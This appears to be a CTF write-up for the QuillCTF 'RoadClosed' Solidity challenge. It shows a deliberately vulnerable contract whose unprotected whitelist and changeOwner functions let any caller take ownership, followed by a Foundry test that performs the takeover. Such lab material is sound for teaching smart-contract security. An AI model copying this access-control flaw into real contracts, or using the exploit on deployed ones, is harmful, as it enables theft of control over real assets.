---
title: QuillCTF-1.RoadClosed
date: 2024-01-22 16:59:30
tags:
    - Solidity
categories: 
    - QuillCTF
---

```
“We keep out the wrong people – by letting anyone in.”
```

## Objective

1. Become the owner of the contract
2. Change the value of hacked to true

## Code

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

contract RoadClosed {

    bool hacked;
    address owner;
		address pwner;
    mapping(address => bool) whitelistedMinters;


    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
            }
        return size > 0;
    }

    function isOwner() public view returns(bool){
        if (msg.sender==owner) {
            return true;
        }
        else return false;
    }

    constructor() {
        owner = msg.sender;
    }

    function addToWhitelist(address addr) public {
        require(!isContract(addr),"Contracts are not allowed");
        whitelistedMinters[addr] = true;
    }
    

    function changeOwner(address addr) public {
        require(whitelistedMinters[addr], "You are not whitelisted");
				require(msg.sender == addr, "address must be msg.sender");
        require(addr != address(0), "Zero address");
        owner = addr;
    }

    function pwn(address addr) external payable{
        require(!isContract(msg.sender), "Contracts are not allowed");
				require(msg.sender == addr, "address must be msg.sender");
        require (msg.sender == owner, "Must be owner");
        hacked = true;
    }

    function pwn() external payable {
        require(msg.sender == pwner);
        hacked = true;
    }

    function isHacked() public view returns(bool) {
        return hacked;
    }
}
```

## Observation

Just call function one by one.

## Attack

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.7;

import "../src/1-RoadClosed/roadclosed.sol";
import "forge-std/Test.sol";

contract RoadClosedTest is Test {
    RoadClosed challenge;

    address public deployer;
    address public pwner;

    function setUp() public {
        vm.startPrank(deployer);
        challenge = new RoadClosed();
        vm.stopPrank();
        pwner = makeAddr("0xdeadbeef");
    }

    function testOwner() public {
        vm.startPrank(deployer);
        assertEq(challenge.isOwner(), true);
    }

    function testStatus() public {
        vm.startPrank(pwner);
        assertEq(challenge.isHacked(), false);
    }

    function testAttack() public {
        vm.startPrank(pwner);
        challenge.addToWhitelist(pwner);
        challenge.changeOwner(pwner);
        challenge.pwn(pwner);
        assertEq(challenge.isHacked(), true);
    }
}
```